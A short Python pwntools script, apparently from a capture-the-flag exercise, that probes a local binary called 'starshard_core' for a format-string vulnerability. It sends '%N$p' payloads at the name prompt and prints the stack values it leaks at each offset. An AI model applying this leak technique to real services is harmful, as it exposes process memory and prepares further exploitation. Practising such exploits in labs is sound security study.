from pwn import *

# Set up the binary context
exe = ELF("./starshard_core")
context.binary = exe
context.log_level = 'error' # reduce noise to see your print output clearly
# Iterative approach (slower, but useful for testing specific direct access)
for i in range(1, 21):
    p = process(exe.path) # Start NEW process every time
    payload = f"%{i}$p"   # f-string to inject the number
    p.sendlineafter(b"Name: ", payload.encode())
    # ... inside the loop ...
    p.recvuntil(b"Welcome ")

    raw_output = p.recvline().decode()
    val = raw_output.split()[0]  # This grabs just the hex, ignoring "— Starshard..."

    print(f"Offset {i}: {val}")
    p.close()